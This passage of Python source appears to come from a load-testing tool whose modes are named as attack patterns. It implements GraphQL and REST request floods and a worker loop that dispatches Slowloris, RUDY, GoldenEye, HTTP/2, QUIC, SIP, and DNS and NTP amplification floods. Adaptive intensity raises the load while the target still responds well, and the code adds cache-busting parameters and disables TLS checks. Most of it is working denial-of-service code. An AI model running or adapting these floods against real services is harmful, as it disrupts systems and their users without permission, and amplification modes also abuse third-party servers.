        res = {'status': 0, 'size': 0, 'has_errors': False}
        try:
            timeout = aiohttp.ClientTimeout(total=self.cfg['timeout'])
            body = json.dumps(payload)
            async with session.post(url, headers=headers, data=body, ssl=False,
                                    allow_redirects=False, timeout=timeout) as resp:
                data = await resp.read()
                res['status'] = resp.status
                res['size'] = len(data)
                try:
                    parsed = json.loads(data.decode('utf-8', errors='replace'))
                    if isinstance(parsed, dict) and parsed.get('errors'):
                        res['has_errors'] = True
                    elif isinstance(parsed, list):
                        res['has_errors'] = any(
                            isinstance(item, dict) and item.get('errors') for item in parsed)
                except (ValueError, TypeError):
                    pass
        except Exception:
            pass
        return res

    async def _fire_graphql_flood(self, session: aiohttp.ClientSession, uid: int, url: str):
        result = self._make_result(url, correlation_id=self._new_correlation_id(uid))
        try:
            parsed = urlparse(url)
            target = url
            if self.cfg.get('graphql_endpoint'):
                target = self.cfg['graphql_endpoint']
            else:
                path = (parsed.path or '').lower()
                if path in ('', '/') or not path.endswith(('graphql', 'gql', 'query')):
                    if path in ('', '/'):
                        target = url.rstrip('/') + '/graphql'
                    elif not path.endswith(('graphql', 'gql')):
                        target = url.rstrip('/') + '/graphql'
            sep = '&' if '?' in target else '?'
            target = f"{target}{sep}_={_rand_str(8)}"

            depth = max(1, self.cfg.get('graphql_depth', 4))
            batch_size = max(1, self.cfg.get('graphql_batch', 5))

            def _nested_query(d: int) -> str:
                if d <= 0:
                    return 'id name'
                inner = _nested_query(d - 1)
                return f"id name posts {{ {inner} }}"

            queries = [
                {'query': '{ __schema { types { name fields { name } } } }'},
                {'query': '{ __typename }'},
                {'query': f'query {{ user(id: {random.randint(1, 9999)}) {{ {_nested_query(depth)} }} }}'},
                {'query': f'query {{ viewer {{ id email posts(first: {random.randint(1, 50)}) '
                          f'{{ edges {{ node {{ id title }} }} }} }} }}'},
                {'query': f'query Q{random.randint(1, 999999)}($id: ID!) '
                          f'{{ item(id: $id) {{ id name value }} }}',
                 'variables': {'id': str(random.randint(1, 9999))}},
                {'query': f'mutation {{ createUser(input: {{ name: "{_rand_str(8)}" }}) '
                          f'{{ clientMutationId }} }}'},
                {'query': f'query {{ health status version }}'},
            ]
            batch = random.sample(queries, min(batch_size, len(queries)))

            headers = self._build_headers(correlation_id=result.get('correlation_id'))
            headers['Content-Type'] = 'application/json'
            headers['Accept'] = 'application/json'
            headers.pop('X-Requested-With', None)

            streams = max(1, self.cfg.get('graphql_streams', 6))
            connect_start = time.time()
            calls = []
            for _ in range(streams):
                if len(batch) > 1 and random.random() > 0.4:
                    calls.append(self._graphql_single(session, target, dict(headers), list(batch)))
                else:
                    calls.append(self._graphql_single(session, target, dict(headers),
                                                      random.choice(queries)))
            results = await asyncio.gather(*calls, return_exceptions=True)
            statuses = []
            total_bytes = 0
            gql_errors = 0
            body_sent = 0
            for r in results:
                if isinstance(r, dict):
                    if r.get('status'):
                        statuses.append(r['status'])
                    total_bytes += r.get('size', 0)
                    if r.get('has_errors'):
                        gql_errors += 1
            body_sent = sum(len(json.dumps(b)) for b in batch) * streams
            elapsed = (time.time() - connect_start) * 1000
            result['time'] = elapsed
            result['size'] = total_bytes
            result['bytes_recv'] = total_bytes
            result['bytes_sent'] = body_sent + len(target) * streams
            result['status'] = max(set(statuses), key=statuses.count) if statuses else 200
            result['connect_time_ms'] = elapsed * 0.2
            result['ttfb_ms'] = elapsed * 0.3
            result['network_overhead_est'] = elapsed * 0.1
            async with self._lock:
                self.metrics.graphql_queries_sent += streams
                self.metrics.graphql_errors += gql_errors
        except asyncio.TimeoutError:
            result['error'] = 'timeout'
            result['error_type'] = 'timeout'
            async with self._lock:
                self.metrics.graphql_errors += 1
        except aiohttp.ClientError:
            result['error'] = 'conn'
            result['error_type'] = 'connection'
            async with self._lock:
                self.metrics.graphql_errors += 1
        except Exception:
            result['error'] = 'unknown'
            result['error_type'] = 'unknown'
        return result

    async def _fire_rest_flood(self, session: aiohttp.ClientSession, uid: int, url: str):
        result = self._make_result(url, correlation_id=self._new_correlation_id(uid))
        try:
            base = url.rstrip('/')
            custom = self.cfg.get('rest_endpoints') or []
            default_paths = [
                '/api/v1/users', '/api/v1/items', '/api/v1/orders',
                '/api/v1/products', '/api/v1/search', '/api/v1/status',
                '/api/v2/users', '/api/health', '/api/session', '/api/config',
            ]
            paths = [p if p.startswith('/') else '/' + p for p in custom] if custom else default_paths
            methods_cfg = self.cfg.get('rest_methods') or ['GET', 'GET', 'GET', 'POST', 'PUT', 'PATCH', 'DELETE']
            verb = random.choice(methods_cfg)
            path = random.choice(paths)
            sep = '&' if '?' in (base + path) else '?'
            target = f"{base}{path}{sep}t={int(time.time() * 1000)}&_r={random.randint(1, 999999)}"

            headers = self._build_headers(correlation_id=result.get('correlation_id'))
            headers['Content-Type'] = 'application/json'
            headers['Accept'] = 'application/json'
            headers['X-HTTP-Method-Override'] = verb if verb not in ('GET', 'POST') else verb

            body = None
            if verb in ('POST', 'PUT', 'PATCH'):
                payload = {
                    'id': random.randint(1, 99999),
                    'name': _rand_str(12),
                    'email': f"{_rand_str(8)}@example.com",
                    'amount': round(random.uniform(1, 1000), 2),
                    'tags': [_rand_str(4) for _ in range(random.randint(1, 4))],
                    'meta': {'source': 'loadstorm', 'uid': uid,
                             'correlation_id': result.get('correlation_id') or ''},
                    'nested': {'a': _rand_str(8), 'b': random.randint(0, 100)},
                }
                body = json.dumps(payload)

            calls = max(1, self.cfg.get('rest_parallel', 4))
            connect_start = time.time()

            async def _one() -> dict:
                out = {'status': 0, 'size': 0}
                try:
                    timeout = aiohttp.ClientTimeout(total=self.cfg['timeout'])
                    async with session.request(
                        verb, target, headers=dict(headers), data=body, ssl=False,
                        allow_redirects=self.cfg['follow'], timeout=timeout,
                    ) as resp:
                        data = await resp.read()
                        out['status'] = resp.status
                        out['size'] = len(data)
                except Exception:
                    pass
                return out

            results = await asyncio.gather(*[_one() for _ in range(calls)],
                                           return_exceptions=True)
            statuses = []
            total_bytes = 0
            for r in results:
                if isinstance(r, dict):
                    if r.get('status'):
                        statuses.append(r['status'])
                    total_bytes += r.get('size', 0)
            elapsed = (time.time() - connect_start) * 1000
            sent_body = (len(body) if body else 0) * calls
            result['time'] = elapsed
            result['size'] = total_bytes
            result['bytes_recv'] = total_bytes
            result['bytes_sent'] = sent_body + (len(target) + sum(
                len(f"{k}: {v}") for k, v in headers.items())) * calls
            result['status'] = max(set(statuses), key=statuses.count) if statuses else 0
            result['connect_time_ms'] = elapsed * 0.2
            result['ttfb_ms'] = elapsed * 0.3
            result['network_overhead_est'] = elapsed * 0.1
            result['rest_verb'] = verb
            result['rest_path'] = path
            async with self._lock:
                self.metrics.rest_requests_sent += calls
        except asyncio.TimeoutError:
            result['error'] = 'timeout'
            result['error_type'] = 'timeout'
        except aiohttp.ClientError:
            result['error'] = 'conn'
            result['error_type'] = 'connection'
        except Exception:
            result['error'] = 'unknown'
            result['error_type'] = 'unknown'
        return result

    async def _fire_websocket(self, uid: int, url: str,
                              msg_type: str = "text", msg_size: int = 64,
                              ping_interval: float = 0.0,
                              reconnect_attempts: int = 3,
                              message_frequency: float = 0.0,
                              fragment_size: int = 0,
                              custom_payload_hex: Optional[str] = None):
        result = self._make_result(url, correlation_id=self._new_correlation_id(uid))

        custom_payload = None
        if custom_payload_hex:
            try:
                custom_payload = bytes.fromhex(custom_payload_hex)
            except ValueError:
                pass

        for attempt in range(reconnect_attempts):
            try:
                connect_start = time.time()
                async with websockets.connect(url, open_timeout=self.cfg['timeout']) as ws:
                    connect_ms = (time.time() - connect_start) * 1000
                    result['connect_time_ms'] = connect_ms

                    num_msgs = random.randint(1, 5)
                    for i in range(num_msgs):
                        if self._stop.is_set():
                            break

                        if message_frequency > 0:
                            await asyncio.sleep(1.0 / message_frequency)

                        if msg_type == "binary":
                            payload = custom_payload if custom_payload else os.urandom(msg_size)
                            if fragment_size > 0 and len(payload) > fragment_size:
                                for j in range(0, len(payload), fragment_size):
                                    fragment = payload[j:j + fragment_size]
                                    await ws.send(fragment)
                                    result['bytes_sent'] += len(fragment)
                            else:
                                await ws.send(payload)
                                result['bytes_sent'] += len(payload)
                        elif msg_type == "ping":
                            await ws.ping()
                            result['bytes_sent'] += 2
                            try:
                                await asyncio.wait_for(ws.recv(), timeout=5)
                                result['bytes_recv'] += 2
                            except asyncio.TimeoutError:
                                pass
                            result['ws_msgs'] += 1
                            continue
                        else:
                            if custom_payload:
                                payload = custom_payload.decode('utf-8', errors='replace')
                            else:
                                payload = _rand_str(msg_size)
                            if fragment_size > 0 and len(payload) > fragment_size:
                                for j in range(0, len(payload), fragment_size):
                                    fragment = payload[j:j + fragment_size]
                                    await ws.send(fragment)
                                    result['bytes_sent'] += len(fragment)
                            else:
                                await ws.send(payload)
                                result['bytes_sent'] += len(payload)

                        try:
                            response = await asyncio.wait_for(ws.recv(), timeout=5)
                            result['ws_msgs'] += 1
                            result['size'] += len(response)
                            result['bytes_recv'] += len(response)
                        except asyncio.TimeoutError:
                            pass

                        if ping_interval > 0:
                            await asyncio.sleep(ping_interval)

                    elapsed = (time.time() - connect_start) * 1000
                    result['time'] = elapsed
                    result['status'] = 101
                    result['network_overhead_est'] = connect_ms * 0.3
                    return result

            except Exception:
                if attempt < reconnect_attempts - 1:
                    await asyncio.sleep(0.5 * (attempt + 1))
                    continue

        result['error'] = 'ws_error'
        result['error_type'] = 'connection'
        return result

    async def _worker(self, session: aiohttp.ClientSession, uid: int):
        async with self._sem:
            async with self._lock:
                self._active += 1
                if self._active > self.metrics.max_concurrent:
                    self.metrics.max_concurrent = self._active
                self.metrics.active_users = self._active
                self._cookie_jar[uid] = {}
                self._conn_pool.register_worker(uid)

            try:
                while self.running and not self._stop.is_set():
                    if self.cfg['rate_limit'] > 0:
                        await asyncio.sleep(1.0 / self.cfg['rate_limit'])

                    if self.cfg.get('adaptive_rate'):
                        await asyncio.sleep(self._adaptive_delay)

                    effective_delay = self.cfg.get('worker_delay', 0)
                    if effective_delay > 0:
                        await asyncio.sleep(effective_delay)

                    urls = self.cfg.get('urls', [self.cfg['url']])
                    target_url = self._select_url(uid) if len(urls) > 1 else urls[0]

                    validation = None
                    if self.cfg.get('validations'):
                        validation = random.choice(self.cfg['validations'])

                    pattern = self._resolve_active_pattern()
                    if self._multi_vectors and not self._chain:
                        pattern = random.choice(self._multi_vectors)
                        async with self._lock:
                            key = pattern.value
                            self.metrics.vector_usage[key] = self.metrics.vector_usage.get(key, 0) + 1
                    cid = self._new_correlation_id(uid)

                    if pattern == AttackPattern.SLOWLORIS:
                        result = await self._fire_slowloris(uid, target_url)
                        await self._process_result(result, uid)
                        await asyncio.sleep(random.uniform(1, 5))
                    elif pattern == AttackPattern.RUDY:
                        result = await self._fire_rudy(uid, target_url)
                        await self._process_result(result, uid)
                        await asyncio.sleep(random.uniform(0.5, 2))
                    elif pattern == AttackPattern.GOLDENEYE:
                        result = await self._fire_goldeneye(session, uid, target_url)
                        await self._process_result(result, uid)
                        await asyncio.sleep(random.uniform(0.1, 1))
                    elif pattern == AttackPattern.XMLRPC:
                        result = await self._fire(session, uid, target_url, 'POST', correlation_id=cid)
                        await self._process_result(result, uid)
                        await asyncio.sleep(random.uniform(0.05, 0.3))
                    elif pattern == AttackPattern.ENDLESS_DATA:
                        result = await self._fire_endless_data(uid, target_url)
                        await self._process_result(result, uid)
                        await asyncio.sleep(random.uniform(0.5, 2))
                    elif pattern == AttackPattern.HEADER_FLOOD:
                        result = await self._fire_header_flood(uid, target_url)
                        await self._process_result(result, uid)
                        await asyncio.sleep(random.uniform(0.1, 0.5))
                    elif pattern == AttackPattern.POST_LARGE_BODY:
                        result = await self._fire(session, uid, target_url, 'POST', correlation_id=cid)
                        await self._process_result(result, uid)
                        await asyncio.sleep(random.uniform(0.5, 2))
                    elif pattern == AttackPattern.H2_FLOOD:
                        result = await self._fire_h2_flood(session, uid, target_url)
                        await self._process_result(result, uid)
                        await asyncio.sleep(random.uniform(0.01, 0.1))
                    elif pattern == AttackPattern.WEBSOCKET_FLOOD:
                        result = await self._fire_websocket_flood(uid, target_url)
                        await self._process_result(result, uid)
                        await asyncio.sleep(random.uniform(0.05, 0.3))
                    elif pattern == AttackPattern.SLOW_READ:
                        result = await self._fire_slow_read(session, uid, target_url)
                        await self._process_result(result, uid)
                        await asyncio.sleep(random.uniform(0.5, 2))
                    elif pattern == AttackPattern.CACHE_BYPASS:
                        result = await self._fire_cache_bypass(session, uid, target_url)
                        await self._process_result(result, uid)
                        await asyncio.sleep(random.uniform(0.05, 0.3))
                    elif pattern == AttackPattern.HLS_FLOOD:
                        result = await self._fire_hls_flood(session, uid, target_url)
                        await self._process_result(result, uid)
                        await asyncio.sleep(random.uniform(0.05, 0.3))
                    elif pattern == AttackPattern.GRPC_FLOOD:
                        result = await self._fire_grpc_flood(session, uid, target_url)
                        await self._process_result(result, uid)
                        await asyncio.sleep(random.uniform(0.02, 0.15))
                    elif pattern == AttackPattern.SIP_FLOOD:
                        result = await self._fire_sip_flood(uid, target_url)
                        await self._process_result(result, uid)
                        await asyncio.sleep(random.uniform(0.1, 0.5))
                    elif pattern == AttackPattern.QUIC_FLOOD:
                        result = await self._fire_quic_flood(uid, target_url)
                        await self._process_result(result, uid)
                        await asyncio.sleep(random.uniform(0.01, 0.1))
                    elif pattern == AttackPattern.DNS_AMPLIFICATION:
                        result = await self._fire_dns_amplification(uid, target_url)
                        await self._process_result(result, uid)
                        await asyncio.sleep(random.uniform(0.05, 0.3))
                    elif pattern == AttackPattern.NTP_AMPLIFICATION:
                        result = await self._fire_ntp_amplification(uid, target_url)
                        await self._process_result(result, uid)
                        await asyncio.sleep(random.uniform(0.1, 0.5))
                    elif pattern == AttackPattern.WEBSOCKET_CHAT:
                        result = await self._fire_websocket_chat(uid, target_url)
                        await self._process_result(result, uid)
                        await asyncio.sleep(random.uniform(0.02, 0.2))
                    elif pattern == AttackPattern.GRAPHQL_FLOOD:
                        result = await self._fire_graphql_flood(session, uid, target_url)
                        await self._process_result(result, uid)
                        await asyncio.sleep(random.uniform(0.02, 0.15))
                    elif pattern == AttackPattern.REST_FLOOD:
                        result = await self._fire_rest_flood(session, uid, target_url)
                        await self._process_result(result, uid)
                        await asyncio.sleep(random.uniform(0.02, 0.2))
                    elif self.cfg.get('scenarios'):
                        scenario = random.choice(self.cfg['scenarios'])
                        scenario_cid = cid
                        prev_result = None
                        for step_index, step in enumerate(scenario):
                            if not self.running or self._stop.is_set():
                                break
                            step_url = step.url
                            if self.cfg.get('random_path'):
                                base = step_url.rstrip('/')
                                step_url = base + _get_random_path()

                            if step.ws_message_type in ('text', 'binary', 'ping') and step_url.startswith('ws'):
                                result = await self._fire_websocket(
                                    uid, step_url,
                                    msg_type=step.ws_message_type,
                                    msg_size=step.ws_message_size,
                                    ping_interval=step.ws_ping_interval,
                                    reconnect_attempts=step.ws_reconnect_attempts,
                                    message_frequency=step.ws_message_frequency,
                                    fragment_size=step.ws_fragment_size,
                                    custom_payload_hex=step.ws_custom_payload_hex,
                                )
                                if scenario_cid and not result.get('correlation_id'):
                                    result['correlation_id'] = scenario_cid
                            else:
                                result = await self._fire(
                                    session, uid, step_url, step.method,
                                    step.validation, step.headers, step.body,
                                    step.cookies, correlation_id=scenario_cid,
                                )
                            if step.assertions:
                                failures = self._evaluate_assertions(
                                    step.assertions, result, prev_result,
                                    step_index, scenario_cid)
                                result['assertion_failures'] = failures
                                if failures:
                                    result['valid'] = False
                                    async with self._lock:
                                        self.metrics.scenario_assert_fail += 1
                                        if len(self.metrics.assertion_fail_samples) < 200:
                                            self.metrics.assertion_fail_samples.append({
                                                'correlation_id': scenario_cid,
                                                'step': step_index + 1,
                                                'url': step_url[:120],
                                                'failures': failures[:5],
                                                'timestamp': time.time(),
                                            })
                                else:
                                    async with self._lock:
                                        self.metrics.scenario_assert_pass += 1
                            await self._process_result(result, uid)
                            prev_result = result
                            await asyncio.sleep(random.uniform(0.1, 0.5))
                    else:
                        if self.cfg.get('websocket') and target_url.startswith('ws'):
                            result = await self._fire_websocket(
                                uid, target_url,
                                msg_type=self.cfg.get('ws_msg_type', 'text'),
                                msg_size=self.cfg.get('ws_msg_size', 64),
                                reconnect_attempts=self.cfg.get('ws_reconnect', 3),
                                message_frequency=self.cfg.get('ws_freq', 0.0),
                                fragment_size=self.cfg.get('ws_fragment', 0),
                                custom_payload_hex=self.cfg.get('ws_payload_hex'),
                            )
                        else:
                            result = await self._fire(
                                session, uid, target_url, validation=validation,
                                correlation_id=cid)
                        await self._process_result(result, uid)

                    if self.cfg.get('adaptive_rate'):
                        await self._adapt_rate()

                    if self.cfg.get('dynamic_scale'):
                        await self._dynamic_scale()

                    if self.cfg.get('adaptive_intensity'):
                        await self._adaptive_intensity()

                    if self._auto_tune_state.get('enabled'):
                        await self._auto_tune()

            finally:
                async with self._lock:
                    self._active -= 1
                    self.metrics.active_users = self._active
                    if uid in self._cookie_jar:
                        del self._cookie_jar[uid]

    async def _process_result(self, result: dict, uid: int):
        async with self._lock:
            self.metrics.total_requests += 1
            self._req_count += 1
            self._byte_count += result.get('size', 0)
            self.metrics._req_window += 1
            self.metrics._bytes_window += result.get('size', 0)
            self.metrics.total_bytes += result.get('size', 0)
            self.metrics.total_bytes_sent += result.get('bytes_sent', 0)
            self.metrics.total_bytes_recv += result.get('bytes_recv', 0)
            self.metrics.tick()

            if result.get('connect_time_ms', 0) > 0:
                self.metrics.connection_times_ms.append(result['connect_time_ms'])
            if result.get('ttfb_ms', 0) > 0:
                self.metrics.ttfb_times_ms.append(result['ttfb_ms'])
            if result.get('server_processing_est', 0) > 0:
                self.metrics.server_processing_est_ms.append(result['server_processing_est'])
            if result.get('network_overhead_est', 0) > 0:
                self.metrics.network_overhead_est_ms.append(result['network_overhead_est'])

            cid = result.get('correlation_id') or ''
            if cid:
                self.metrics.correlation_ids_issued += 1
                echo_val = None
                for hk, hv in (result.get('headers') or {}).items():
                    if hk.lower() == 'x-correlation-id':
                        echo_val = hv
                        break
                if echo_val is not None and str(echo_val) == cid:
                    self.metrics.correlation_echoed += 1

            for rule_label in result.get('failed_rules') or []:
                self.metrics.validation_rule_fails[rule_label] = \
                    self.metrics.validation_rule_fails.get(rule_label, 0) + 1

            is_error = False
            if result.get('ws_msgs'):
                self.metrics.websocket_msgs += result['ws_msgs']
                self.metrics.websocket_bytes += result.get('size', 0)

            if result['error']:
                is_error = True
                self.metrics.failed += 1
                self.metrics.record_error()
                err_type = result.get('error_type', 'unknown') or 'unknown'
                self.metrics.error_type_counts[err_type] = self.metrics.error_type_counts.get(err_type, 0) + 1
                self.metrics.record_error_event(err_type)
                if result['error'] == 'timeout':
                    self.metrics.timeout_errors += 1
                else:
                    self.metrics.conn_errors += 1
                if result.get('url'):
                    url_key = result['url'][:50]
                    if url_key not in self.metrics.per_url_metrics:
                        self.metrics.per_url_metrics[url_key] = {'requests': 0, 'errors': 0, 'total_time': 0}
                    self.metrics.per_url_metrics[url_key]['errors'] += 1
            elif result.get('status', 0) >= 500:
                is_error = True
                self.metrics.failed += 1
                self.metrics.record_error()
                self.metrics.http_5xx += 1
                self.metrics.error_type_counts['http_5xx'] = self.metrics.error_type_counts.get('http_5xx', 0) + 1
                self.metrics.record_error_event('http_5xx')
                sc = str(result['status'])
                self.metrics.status_codes[sc] = self.metrics.status_codes.get(sc, 0) + 1
            elif result.get('status', 0) >= 400:
                is_error = True
                self.metrics.failed += 1
                self.metrics.record_error()
                self.metrics.http_4xx += 1
                self.metrics.error_type_counts['http_4xx'] = self.metrics.error_type_counts.get('http_4xx', 0) + 1
                self.metrics.record_error_event('http_4xx')
                sc = str(result['status'])
                self.metrics.status_codes[sc] = self.metrics.status_codes.get(sc, 0) + 1
            else:
                self.metrics.successful += 1
                self.metrics.record_success()
                sc = str(result.get('status', 0))
                self.metrics.status_codes[sc] = self.metrics.status_codes.get(sc, 0) + 1

            self.metrics.rolling_data.record(result.get('time', 0), is_error)

            connect_ok = (not result.get('error')) and result.get('status', 0) < 500
            self._conn_health.record(
                uid % max(1, self.cfg.get('concurrency', 1)),
                connect_ok,
                result.get('connect_time_ms', 0.0),
            )

            if self.metrics.total_requests % 25 == 0:
                self.metrics.record_health_sample()
                bn = self._realtime_bottleneck()
                prev_bn = self.metrics.bottleneck_history[-1]['primary'] if self.metrics.bottleneck_history else None
                if bn['primary'] != prev_bn and bn['primary'] != 'none detected':
                    self.metrics.record_bottleneck(bn)
                    self.metrics.record_timeline_event(
                        'bottleneck',
                        f"bottleneck -> {bn['primary']} ({bn['severity']})",
                        {'primary': bn['primary'], 'severity': bn['severity'],
                         'confidence': bn['confidence']})

            if not result.get('valid', True):
                self.metrics.validation_fails += 1
            else:
                self.metrics.validation_passes += 1

            if result.get('time', 0) > 0:
                self.metrics.record_latency(result['time'], result.get('url', ''))

            if self.cfg.get('detailed_logs'):
                log = RequestLog(
                    timestamp=time.time(),
                    url=result.get('url', ''),
                    method=self.cfg['method'],
                    status=result.get('status', 0),
                    response_time_ms=result.get('time', 0),
                    size_bytes=result.get('size', 0),
                    error=result.get('error'),
                    valid=result.get('valid', True),
                    connect_time_ms=result.get('connect_time_ms', 0),
                    ttfb_ms=result.get('ttfb_ms', 0),
                    download_ms=result.get('download_ms', 0),
                    correlation_id=cid,
                    response_snippet=(result.get('body_snippet') or '')[:500],
                    pattern=self.cfg['pattern'].value,
                    failed_rules=list(result.get('failed_rules') or []),
                    assertion_failures=list(result.get('assertion_failures') or []),
                )
                self.metrics.record_request_log(log)

    async def _adapt_rate(self):
        if len(self.metrics.rps_per_second) < 5:
            return
        recent_rates = list(self.metrics.rps_per_second)[-5:]
        avg_rate = sum(recent_rates) / len(recent_rates)
        if avg_rate > 0:
            error_rate = self.metrics.error_rate / 100
            if error_rate > 0.1:
                self._adaptive_delay = min(0.1, self._adaptive_delay * 1.2)
            elif error_rate < 0.01 and self._adaptive_delay > 0.001:
                self._adaptive_delay = max(0.001, self._adaptive_delay * 0.9)

    def _resolve_active_pattern(self) -> AttackPattern:
        if not self._chain_resolved:
            return self.cfg['pattern']
        elapsed = time.time() - (self.metrics.start_time or time.time())
        for pat, s0, e0 in self._chain_resolved:
            if s0 <= elapsed < e0:
                if self._current_phase != pat.value:
                    self._current_phase = pat.value
                    self.metrics.record_timeline_event(
                        'phase', f"phase -> {pat.value}",
                        {'pattern': pat.value})
                    self.metrics.phase_stats.append({
                        'pattern': pat.value,
                        'start_s': round(s0, 2),
                        'end_s': round(e0, 2),
                    })
                return pat
        last = self._chain_resolved[-1][0]
        if self._current_phase != last.value:
            self._current_phase = last.value
            self.metrics.record_timeline_event(
                'phase', f"phase -> {last.value} (final)",
                {'pattern': last.value})
        return last

    async def _adaptive_intensity(self):
        if not self.cfg.get('adaptive_intensity'):
            return
        now = time.time()
        if not hasattr(self, '_last_intensity_check'):
            self._last_intensity_check = now
            return
        if now - self._last_intensity_check < 2.0:
            return
        self._last_intensity_check = now
        err = self.metrics.error_rate
        r10 = self.metrics.rolling_data.get_stats(10)
        old = self._intensity
        if err > 20 or r10['p95_ms'] > 5000:
            self._intensity = max(0.2, self._intensity * 0.85)
            reason = 'high errors/latency'
        elif err > 5 or r10['p95_ms'] > 2000:
            self._intensity = max(0.3, self._intensity * 0.95)
            reason = 'moderate degradation'
        elif err < 1 and r10['p95_ms'] < 500:
            self._intensity = min(2.0, self._intensity * 1.05)
            reason = 'healthy - ramping up'
        else:
            reason = 'stable'
        if abs(self._intensity - old) >= 0.01:
            self.metrics.record_intensity(self._intensity, reason)
            self.metrics.record_timeline_event(
                'intensity', f"intensity {old:.2f} -> {self._intensity:.2f} ({reason})",
                {'factor': round(self._intensity, 3), 'reason': reason})

    async def _dynamic_scale(self):
        error_rate = self.metrics.error_rate
        if error_rate > 25:
            prev = self._dynamic_scale_factor
            self._dynamic_scale_factor = max(0.3, self._dynamic_scale_factor * 0.92)
            self.metrics.dynamic_scale_history.append(
                (time.time(), round(self._dynamic_scale_factor, 3), 'reduce', round(error_rate, 2))
            )
            if abs(prev - self._dynamic_scale_factor) > 0.01:
                self.metrics.record_timeline_event(
                    'scale', f"scale down -> {self._dynamic_scale_factor:.2f} (err {error_rate:.1f}%)",
                    {'factor': round(self._dynamic_scale_factor, 3), 'error_rate': round(error_rate, 2)})
        elif error_rate < 5:
            prev = self._dynamic_scale_factor
            self._dynamic_scale_factor = min(2.0, self._dynamic_scale_factor * 1.03)
            self.metrics.dynamic_scale_history.append(
                (time.time(), round(self._dynamic_scale_factor, 3), 'increase', round(error_rate, 2))
            )
            if abs(prev - self._dynamic_scale_factor) > 0.01:
                self.metrics.record_timeline_event(
                    'scale', f"scale up -> {self._dynamic_scale_factor:.2f} (err {error_rate:.1f}%)",
                    {'factor': round(self._dynamic_scale_factor, 3), 'error_rate': round(error_rate, 2)})

    def _get_user_count_at(self, elapsed: float) -> int:
        if self._chain_resolved:
            pattern = self._resolve_active_pattern()
        else:
            pattern = self.cfg['pattern']
        total = self.cfg['users']
        dur = self.cfg['duration']
        progress = min(1.0, elapsed / dur) if dur > 0 else 1.0

        if pattern == AttackPattern.CONSTANT:
            return total
        elif pattern == AttackPattern.RAMP:
            return int(total * progress)
        elif pattern == AttackPattern.SPIKE:
            phase = int(elapsed / (dur / 3)) % 3
            cycle = elapsed % (dur / 3)
            if phase == 0:
                return int(total * min(1.0, cycle / (dur / 6)))
            elif phase == 1:
                return 0
            else:
                return int(total * min(1.0, cycle / (dur / 6)))
        elif pattern == AttackPattern.WAVE:
            wave = (math.sin(2 * math.pi * progress * 3) + 1) / 2
            return int(total * wave)
        elif pattern == AttackPattern.STEPPED:
            steps = 5
            step = int(progress * steps)
            return int(total * (step + 1) / steps)
        elif pattern == AttackPattern.PULSE:
            pulse = 1.0 if math.sin(4 * math.pi * progress) > 0.3 else 0.1
            return int(total * pulse)
        elif pattern == AttackPattern.TARGETED:
            ramp_end = 0.2
            hold_end = 0.8
            if progress < ramp_end:
                return int(total * (progress / ramp_end))
            elif progress < hold_end:
                return total
            else:
                return int(total * (1.0 - (progress - hold_end) / (1.0 - hold_end)))
        elif pattern == AttackPattern.STAIRCASE:
            steps = 6
            step = int(progress * steps)
            return int(total * (step + 1) / steps)
        elif pattern == AttackPattern.ELASTIC:
            cycle = math.sin(2 * math.pi * progress * 2) + math.sin(2 * math.pi * progress * 5) * 0.3
            return int(total * max(0.1, (cycle + 1) / 2))
        elif pattern == AttackPattern.RANDOM_CHAOS:
            return int(total * random.uniform(0.1, 1.0))
        elif pattern in (AttackPattern.SLOWLORIS, AttackPattern.RUDY):
            return int(total * min(1.0, progress * 1.5))
        elif pattern == AttackPattern.GOLDENEYE:
            wave = (math.sin(2 * math.pi * progress * 2) + 1) / 2
            return int(total * max(0.3, wave))
        elif pattern in (AttackPattern.MULTIPART, AttackPattern.XMLRPC, AttackPattern.ENDLESS_DATA,
                         AttackPattern.HEADER_FLOOD, AttackPattern.POST_LARGE_BODY,
                         AttackPattern.H2_FLOOD, AttackPattern.WEBSOCKET_FLOOD,
                         AttackPattern.SLOW_READ, AttackPattern.CACHE_BYPASS,
                         AttackPattern.HLS_FLOOD, AttackPattern.GRPC_FLOOD,
                         AttackPattern.SIP_FLOOD, AttackPattern.QUIC_FLOOD,
                         AttackPattern.DNS_AMPLIFICATION, AttackPattern.NTP_AMPLIFICATION,
                         AttackPattern.WEBSOCKET_CHAT, AttackPattern.GRAPHQL_FLOOD,
                         AttackPattern.REST_FLOOD):
            return int(total * min(1.0, progress))
        return total

    async def _adaptive_launcher(self, session: aiohttp.ClientSession):
        tasks = []
        launched = 0
        start = time.time()
        self._test_start_display = start

        while self.running and not self._stop.is_set():
            elapsed = time.time() - start
            if elapsed >= self.cfg['duration']:
                break

            target = self._get_user_count_at(elapsed)
            effective_target = int(target * self._dynamic_scale_factor * self._intensity)
            to_launch = max(0, effective_target - launched)
            batch = min(to_launch, max(1, self.cfg['batch_size']))

            for _ in range(batch):
                if launched >= self.cfg['users']:
                    break
                task = asyncio.create_task(self._worker(session, launched))
                tasks.append(task)
                launched += 1

            await asyncio.sleep(0.05)

        if tasks:
            await asyncio.gather(*tasks, return_exceptions=True)

    async def _timer(self):
        await asyncio.sleep(self.cfg['duration'])
        self._stop.set()

    async def _display_loop(self):
        while self.running and not self._stop.is_set():
            await asyncio.sleep(0.5)
            self._print_live()

    def _print_eta(self, elapsed: float, progress: float) -> str:
        if progress <= 0:
            return "--:--"
        remaining = self.cfg['duration'] - elapsed
        if remaining <= 0:
            return "00:00"
        mins = int(remaining) // 60
        secs = int(remaining) % 60
        return f"{mins:02d}:{secs:02d}"

    def _print_ascii_histogram(self, buckets: dict, width: int = 30) -> List[str]:
        total = sum(buckets.values()) or 1
        max_count = max(buckets.values()) if buckets else 1
        lines = []
        for label, count in buckets.items():
            pct = count / total * 100
            bar_len = int((count / max_count) * width) if max_count > 0 else 0
            if '<50' in label or '50-100' in label or '100-200' in label:
                color = Fore.GREEN
            elif '200' in label or '500' in label:
                color = Fore.YELLOW
            else:
                color = Fore.RED
            bar = f"{color}{'#' * bar_len}{'.' * (width - bar_len)}{Style.RESET_ALL}"
            lines.append((label, bar, pct))
        return lines

    def _print_throughput_graph(self, width: int = 30) -> str:
        history = list(self.metrics._throughput_history)[-width:]
        if not history:
            return '.' * width
        max_val = max(history) if max(history) > 0 else 1
        sparks = ' .:-=+*#%@'
        return ''.join([sparks[min(9, int(v / max_val * 9))] for v in history])

    def _percentile_spark(self, key: str, width: int = 24) -> str:
        hist = [h.get(key, 0) for h in self.metrics.percentile_history][-width:]
        if not hist:
            return '.' * 8
        mx = max(hist) or 1
        sparks = ' .:-=+*#%@'
        return ''.join(sparks[min(9, int(v / mx * 9))] for v in hist)

